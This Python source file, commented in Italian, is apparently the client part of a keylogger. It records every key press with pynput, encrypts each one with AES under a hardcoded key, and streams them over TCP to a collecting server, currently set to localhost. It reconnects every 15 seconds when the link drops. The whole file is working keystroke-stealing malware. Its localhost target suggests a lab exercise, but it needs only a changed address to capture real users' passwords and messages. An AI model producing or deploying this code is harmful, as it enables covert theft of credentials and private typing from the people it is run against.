# Client Program
import socket
from pynput.keyboard import Listener #Libreria per leggere i caratteri digitati sulla tastiera
import time

from Crypto.Cipher import AES

def do_encrypt(message: str):
    obj = AES.new(b'Fm!t%68Hava!wq&)', AES.MODE_CFB, b'Fh78&rsV2!894R6$')
    ciphertext = obj.encrypt(message.encode())
    return ciphertext


connected = False 
while not connected:
    # Crea il socket "stream based" basato sul protocollo TCP ed indirizzi IPv4
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
    # Connetto il client al server
    print("> Connessione... ")  

    try:  
        #clientSocket.connect(("10.0.2.2",9090))
        clientSocket.connect(("127.0.0.1",9090))
        connected = True  
        print( "> Connessione eseguita" )

        # Funzione che si occupa di inviare il carattere digitato.
        def on_press(key):
            clientSocket.send(do_encrypt(str(key)))

        # Creo un istanza di un listener che registra tutte le pressioni dei tasti.
        # Il costruttore prende la funzione creata e usa il metodo join per joinare l'istanza nel thread principale.
        try:
            with Listener(on_press=on_press) as listener:
                listener.join()

        except socket.error:
            print( "  >> Connessione persa" ) 
            connected = False

    except socket.error:  
        print("  >> Connessione fallita")
        time.sleep(15)